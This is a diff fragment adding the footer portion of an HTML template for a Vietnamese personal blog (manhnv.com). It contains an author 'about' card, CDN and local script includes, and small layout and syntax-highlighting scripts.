+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://manhnv.com/favicon.png" alt="Ảnh đại diện" />
+    
+    <h4 id="about-card-name">Manh NV</h4>
+    
+      <div id="about-card-bio">Chia sẻ là niềm vui</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Viết blog dạo
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        VietNam
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://manhnv.com/images/cover-v1.2.0.jpg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://manhnv.com/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js"></script>
+
+
+  
+    <script src="https://manhnv.com/js/scripts.js"></script>
+  
+
+<script lang="javascript">
+window.onload = updateMinWidth;
+window.onresize = updateMinWidth;
+document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
+function updateMinWidth() {
+  var sidebar = document.getElementById("sidebar");
+  var main = document.getElementById("main");
+  main.style.minWidth = "";
+  var w1 = getComputedStyle(main).getPropertyValue("min-width");
+  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
+  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
+  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
+}
+</script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+  
+
+
+
+
+    
+  </body>
+</html>
+
